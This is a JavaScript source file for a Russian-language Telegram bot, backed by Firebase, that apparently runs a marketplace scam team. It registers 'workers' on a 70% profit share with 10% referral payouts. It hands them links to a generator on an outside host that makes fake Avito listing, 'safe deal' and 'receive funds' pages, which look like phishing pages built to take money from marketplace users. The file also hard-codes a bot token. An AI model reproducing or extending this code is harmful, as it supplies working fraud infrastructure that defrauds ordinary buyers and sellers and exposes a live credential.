import { set, ref, onValue, update, remove } from "firebase/database";
import { db } from "./firebase.js";
import { uid } from "uid";
import TelegramBot from "node-telegram-bot-api";

const TOKEN = '6041992162:AAHJ0vdJXB4GH7MqMM0Ljg8Prdgv-rNPg-8';

const bot = new TelegramBot(TOKEN, {
    polling: true
})


let listenerAdmin = '';
let userNameWorkerProfit = '';
let sumProfitWorker = 0;


bot.on("message", (msg) => { // добавить список рефералов для воркера, и что бы показывались его доходы(могут подсматривать)
    onValue(ref(db), snapshot => {
        let worker = snapshot.child(`/workers/${msg.chat.id}`).val()
        b(msg, worker);
    })
})


function b(msg, worker){
    try{
        worker.workerUserName
        switch(msg.text){
            case("🧑‍💻 Профиль"):
            bot.sendMessage(msg.chat.id, '🤑');
            bot.sendMessage(msg.chat.id, `⚙️ <b>Ваш профиль</b>\n\n🆔 Telegram ID: <b>${msg.chat.id}</b>\n💳 Ставка: <b> 70%</b>\n\n💸 У вас <b>${worker.countProfit}</b> профитов <b>(${worker.sumProfit} RUB)</b>\n🧑‍💻 Статус: <b>Воркер</b>\n\n📋 Статус проекта: <b>работает</b>`, 
            {
                parse_mode: 'HTML',
                reply_markup: {
                    
                    keyboard: [
                        [
                            {text: "🧑‍💻 Профиль"},
                            {text: "⚙️ Настройки"}
                        ],
                        [
                            {text: "📗 Мои объявления"},
                            {text: "📝 Создать объявление"}
                        ]
                    ],
                    resize_keyboard: true
                }    
            });
                break;
            
            case("⚙️ Настройки"):
            bot.sendMessage(msg.chat.id, `⚙️ <b>Настройки</b>\n\n🧑‍💻 <b>Ваш ник:</b> ${worker.workerUserName}\n👥 <b>Пригласил:</b> ${worker.hrUserName}\n\n<b>🔗 Ваша ссылка: </b> https://t.me/dfkgpdfgdf_bot?start=${msg.chat.id}\n\n💰 <b>Процент от рефералов:</b> 10%`, {parse_mode: 'HTML', 
            reply_markup: {
                inline_keyboard: [
                    [{text: "👨‍👩‍👧‍👦 Мои рефералы", callback_data: `myReferals`}],
                    [{text: "💌 Чат воркеров", url: 'https://google.com/ru'}, {text: "🧾 Чат с профитами", url: 'https://google.com/ru'}]
                ]
            }})
                break;

            case("📝 Создать объявление"):
            bot.sendMessage(msg.chat.id, `📝 <b>Создание объявлений и трек номеров</b>\n\n✏️ Выберите сервис:`, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{text: "Авито", url: `http://u152542.test-handyhost.ru/generator/${msg.chat.id}`}]
                    ]
                }
            })
                break;

            case("📗 Мои объявления"):
                bot.sendMessage(msg.chat.id, "👇 <b>Выберите сервис:</b>", {parse_mode:'HTML', reply_markup: { inline_keyboard: [[{text: 'Авито', callback_data: 'myAvitoPages'}]]}})
                // let arr = [];
                // onValue(ref(db), (snapshot) => {
                //     const data = snapshot.child(`/workers/${msg.chat.id}/avitoUrls`).val();
                //     if(data !== null){
                //         let countPages = 0;
                //         Object.values(data).map((page) => {
                //             arr.push([{text: `📦 ${page.tovarSum} RUB - ${page.tovarName}`, callback_data: `avito${page.uuid}` }],)
                //             countPages++;
                //         })
                //         arr.push([{text: `❌ Очистить список`, callback_data: `deleteAllAvitoPages`}])
                //         bot.sendMessage(msg.chat.id, `<b>📦 Ваши обьявления (${countPages}):</b>`, {
                //             parse_mode: 'HTML',
                //             reply_markup: {
                //                 inline_keyboard: arr
                //             }
                //         })
                //     } else{
                //         bot.sendMessage(msg.chat.id, "<b>❗️ У вас нет объявлений и трек номеров</b>", {parse_mode: 'HTML'})
                //     }
                // })
                
                break;
            
            default:
                bot.sendMessage(msg.chat.id, '🤑');
                bot.sendMessage(msg.chat.id, `⚙️ <b>Ваш профиль</b>\n\n🆔 Telegram ID: <b>${msg.chat.id}</b>\n💳 Ставка: <b>[RU] 70%</b>\n\n💸 У вас <b>${worker.countProfit}</b> профитов <b>(${worker.sumProfit} RUB)</b>\n🧑‍💻 Статус: <b>Воркер</b>\n\n📋 Статус проекта: <b>работает</b>`, 
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        
                        keyboard: [
                            [
                                {text: "🧑‍💻 Профиль"},
                                {text: "⚙️ Настройки"}
                            ],
                            [
                                {text: "📗 Мои объявления"},
                                {text: "📝 Создать объявление"}
                            ]
                        ],
                        resize_keyboard: true
                    }    
                }    
            );
        }
    } catch(error){
        onValue(ref(db), snapshot => { 
        const adminId = snapshot.child(`/adminId`).val()
        protectAdmin(msg, adminId)
    })
    }
}


function protectAdmin(msg, adminId){
    if(msg.chat.id == adminId){
        if(msg.text.startsWith('/addProfit')){
            bot.sendMessage(msg.chat.id, "Введите имя пользователя, которому записать профит");
            listenerAdmin = "workerUserName";
            /*
            bot.sendMessage(msg.chat.id, workUser)
            onValue(ref(db), (snapshot) => {
                const data = snapshot.child(`/workers`).val();
                if(data !== null){
                    let searchingWorker = false;
                    Object.values(data).map((referal) => {
                        
                    })
                    
                }
            })
            */

        } else{
            if(listenerAdmin == 'workerUserName'){
                userNameWorkerProfit = msg.text;
                bot.sendMessage(msg.chat.id, "Введите сумму профита");
                listenerAdmin = 'sumProfit';
            } else if(listenerAdmin == 'sumProfit'){
                sumProfitWorker = parseInt(msg.text);
                bot.sendMessage(msg.chat.id, "Профит добавлен, вот профиль воркера");
                bot.sendMessage(msg.chat.id, `имя воркера:${userNameWorkerProfit} сумма профита:${sumProfit}`)
                let searchingWorker = false;
                onValue(ref(db), (snapshot) => {
                    const data = snapshot.child(`/workers`).val();
                    if(data !== null){
                        let searchingWorker = false;
                        Object.values(data).map((worker) => {
                            if(worker.workerUserName === userNameWorkerProfit){
                                update(ref(db, `/workers/${worker.workerId}`), {
                                    countProfit,
                                    hrUserName,
                                    sumProfit,
                                    workerId,
                                    workerUserName
                                })
                                bot.sendMessage(msg.chat.id, `Воркер ${worker.workerUserName} Найден, сейчас его баланс: ${worker.sumProfit}`)
                                searchingWorker = true;
                            }
                        })
                        if(searchingWorker === false){
                            bot.sendMessage(msg.chat.id, "Такого пользователя не найденно")
                        }
                        
                    }
                })
                listenerAdmin = '';
            } else {
                bot.sendMessage(msg.chat.id, "Привет админ");
            }
        }
    } else { 
        if(msg.text.startsWith('/start')){
            const refId = msg.text.slice(7);
            let hrUserName = 'Нет';
            onValue(ref(db), (snapshot) => {
                try{
                //hrUserName = snapshot.child(`/workers/${refId}/workerUserName`).val();
                const i = snapshot.child(`/workers/${refId}/workerUserName`).val();
                if(i !== null){
                    hrUserName = i;
                    set(ref(db, `/workers/${refId}/myReferals/${msg.chat.id}`), {
                        userName: `@${msg.chat.username}`,
                        id: `${msg.chat.id}`
                    })
                }
                } catch(error){}
            })
            set(ref(db, `/workers/${msg.chat.id}`), {
                countProfit: 0,
                sumProfit: 0,
                hrUserName: hrUserName,
                workerId: msg.chat.id,
                workerUserName: `@${msg.chat.username}`
            })
        } else {
            set(ref(db, `/workers/${msg.chat.id}`), {
                countProfit: 0,
                sumProfit: 0,
                hrUserName: '',
                workerId: msg.chat.id,
                workerUserName: `@${msg.chat.username}`
            })
        }
        bot.sendMessage(msg.chat.id, "<b>Добро пожаловать</b>", {
            parse_mode: 'HTML',
            reply_markup: {
                
                keyboard: [
                    [
                        {text: "🧑‍💻 Профиль"},
                        {text: "⚙️ Настройки"}
                    ],
                    [
                        {text: "📗 Мои объявления"},
                        {text: "📝 Создать объявление"}
                    ]
                ],
                resize_keyboard: true
            }    
        })
    }
}

bot.on('callback_query', query => {
    try{
        if(query.data.startsWith('avito')){
            //bot.sendMessage(query.from.id, "Нажал на страницу авито " + query.data.slice(5))
            onValue(ref(db), (snapshot) => {
                try{
                //hrUserName = snapshot.child(`/workers/${refId}/workerUserName`).val();
                const i = snapshot.child(`/avito/${query.data.slice(5)}`).val();
                if(i !== null){
                    bot.sendMessage(query.from.id, `📦 <b>Информация об объявлении</b>\n\n🏷 Название: <b>${i.tovarName}</b>\n💵 Стоимость: <b>${i.tovarSum}</b>\n🔍 Местоположение: <b>${i.cityOtpr}</b>\n\n🎁 Авито: <b>Ссылка</b>`, {
                        parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard:[
                            [{text: "Доставка", url: `http://u152542.test-handyhost.ru/objavlenie/${query.data.slice(5)}`}, {text: "Безопас. сделка", url: `http://u152542.test-handyhost.ru/sdelka/${query.data.slice(5)}`}],
                            [{text: "Получ. средств", url: `http://u152542.test-handyhost.ru/poluchenie/${query.data.slice(5)}`}]
                        ]
                    }
                    })
                }
                } catch(error){}
            })
        } else {
            switch(query.data){
                case('deleteAllAvitoPages'):
                    // query.from.id взять от сюда uuid страницы, и в общей массе так же удалять эти страницы
                    remove(ref(db, `/workers/${query.from.id}/avitoUrls`)); 
                    bot.sendMessage(query.from.id, "Вы очистили список обьявлений.")
                    break;
                
                case('myReferals'):
                onValue(ref(db), (snapshot) => {
                    const data = snapshot.child(`/workers/${query.from.id}/myReferals`).val();
                    if(data !== null){
                        let text = 'Мои рефералы:\n\n'// добавить id рефералу, можно прокидывать и смотреть его баланс добавить поле общие профиты сумма, а не актуальный баланс
                        let contReferals = 0
                        Object.values(data).map((referal) => {
                            onValue(ref(db), (snap) => {
                                const worker = snap.child(`/workers/${referal.id}`).val();
                                if(worker !== null){
                                    contReferals++;
                                    text += `${contReferals})🧑‍💻<b>Реферал:</b> ${worker.workerUserName}\n💳<b>Профитов:</b> ${worker.countProfit}\n💵<b>Баланс:</b> ${worker.sumProfit}\n\n`;
                                }
                            })
                        })
                        bot.sendMessage(query.from.id, text, {parse_mode: 'HTML'});
                    } else {
                        bot.sendMessage(query.from.id, "❗️ <b>У вас нет рефералов</b>", {parse_mode: 'HTML'})
                    }
                })
                    break;

                case('myAvitoPages'):
                let arr = [];
                onValue(ref(db), (snapshot) => {
                    const data = snapshot.child(`/workers/${query.from.id}/avitoUrls`).val();
                    if(data !== null){
                        let countPages = 0;
                        Object.values(data).map((page) => {
                            arr.push([{text: `📦 ${page.tovarSum} RUB - ${page.tovarName}`, callback_data: `avito${page.uuid}` }],)
                            countPages++;
                        })
                        arr.push([{text: `❌ Очистить список`, callback_data: `deleteAllAvitoPages`}])
                        bot.sendMessage(query.from.id, `<b>📦 Ваши обьявления (${countPages}):</b>`, {
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: arr
                            }
                        })
                    } else{
                        bot.sendMessage(query.from.id, "<b>❗️ У вас нет объявлений и трек номеров</b>", {parse_mode: 'HTML'})
                    }
                })    

                    break;
    
                default:
                    bot.sendMessage(query.from.id, "Что-то не то")
            }
        }
        console.log(query.data);
        
    } catch(error){
        console.log(error);
    }
})


  